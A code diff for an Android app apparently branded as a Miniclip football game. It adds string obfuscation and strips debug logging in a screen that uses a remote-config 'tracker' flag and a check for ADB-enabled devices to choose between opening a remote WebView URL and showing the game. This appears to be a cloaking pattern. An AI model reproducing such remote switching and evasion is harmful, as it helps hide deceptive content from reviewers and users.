@@ -6,7 +6,6 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
-import android.util.Log
 import android.view.LayoutInflater
 import android.view.View
 import android.view.ViewGroup
@@ -24,7 +23,9 @@ import com.miniclip.footb.databinding.FragmentIntroBinding
 import com.miniclip.footb.model.CollectDataForLink
 import com.miniclip.footb.model.ConfigData
 import com.miniclip.footb.model.TrackingData
+import com.miniclip.footb.services.analytic.NotificationMessageManager
 import com.miniclip.footb.services.analytic.NotificationMessageManager.URL_KEY
+import com.miniclip.footb.services.analytic.NotificationTypes
 import com.miniclip.footb.services.analytic.checkAndNavigateWithValues
 import com.miniclip.footb.services.extensions.g_param.AdvertisingParamImpl
 import com.miniclip.footb.services.extensions.phone_param.PhoneExtensionImpl
@@ -42,6 +43,7 @@ import com.miniclip.footb.ui.intro_screen.interfaces.RemoteServerScheme
 import com.miniclip.footb.ui.web_screen.WorldWideWebActivity
 import com.miniclip.footb.viewmodels.IntroViewModel
 import dagger.hilt.android.AndroidEntryPoint
+import io.github.boiawidmb9mb12095n21b50215b16132.b21nm01om5n1905mw0bdkb2b515.ObfustringThis
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.async
 import kotlinx.coroutines.awaitAll
@@ -50,6 +52,7 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import javax.inject.Inject
 
+@ObfustringThis
 @AndroidEntryPoint
 class IntroFragment : Fragment(), RemoteServerScheme {
 
@@ -119,6 +122,8 @@ class IntroFragment : Fragment(), RemoteServerScheme {
             repeatOnLifecycle(Lifecycle.State.STARTED) {
                 introViewModel.savedUrlState.collect { url ->
                     if (url.isNullOrBlank().not()) {
+                        NotificationMessageManager.signalValue =
+                            NotificationTypes.DIRECT_OPEN.description
                         pathToWeb(url, isCache = true)
                         return@collect
                     } else {
@@ -135,7 +140,6 @@ class IntroFragment : Fragment(), RemoteServerScheme {
             if (configTask.isSuccessful) {
                 val firebaseRemoteConfig = firebaseClient.getDataClass()
 
-                Log.d("ASD", "firebase config = $firebaseRemoteConfig")
                 if (firebaseRemoteConfig.tracker.isBlank() && firebaseRemoteConfig.tracker == "null") {
                     pathToLocalApp()
                 } else {
@@ -146,7 +150,6 @@ class IntroFragment : Fragment(), RemoteServerScheme {
                     )
                 }
             } else {
-                Log.d("ASD", "firebase skip")
                 pathToLocalApp()
             }
         }
@@ -206,7 +209,7 @@ class IntroFragment : Fragment(), RemoteServerScheme {
                 appDeveloperKey = APPS_FLYER_DEV_KEY,
                 userBattery = data.battery.toString(),
                 remoteConfig = ConfigData(
-                    tracker = firebaseRemoteConfig.tracker,
+                    tracker = firebaseRemoteConfig.tracker, // check .isNotEmpty or .isNotBlank?
                     isAppsFlyerEnabled = firebaseRemoteConfig.isAppsFlyerEnabled,
                     fbAppId = checkRemoteFirebaseString(
                         remote = firebaseRemoteConfig.fbAppId,
@@ -218,7 +221,7 @@ class IntroFragment : Fragment(), RemoteServerScheme {
                     )
                 ),
                 attributionData = data.appsFlyerMap,
-                isUserDeveloper = data.adb //+
+                isUserDeveloper = data.adb
             )
 
             introViewModel.getRemoteData(trackingData)
@@ -248,7 +251,6 @@ class IntroFragment : Fragment(), RemoteServerScheme {
     }
 
     override fun pathToWeb(appUrl: String?, isCache: Boolean) {
-        Log.d("ASD", "navigate with url $appUrl")
         Intent(context, WorldWideWebActivity::class.java).run {
             putExtra(URL_KEY, appUrl)
             requireActivity().checkAndNavigateWithValues(this, isCache) {
@@ -258,7 +260,6 @@ class IntroFragment : Fragment(), RemoteServerScheme {
     }
 
     override fun pathToLocalApp() {
-        Log.d("ASD", "NAV TO GAME")
         Intent(context, AppContainerActivity::class.java).run {
             requireActivity().checkAndNavigateWithValues(this) {
                 requireActivity().finish()
@@ -295,6 +296,5 @@ class IntroFragment : Fragment(), RemoteServerScheme {
     }
 
     companion object {
-        private const val TAG = "IntroFragment"
     }
 }
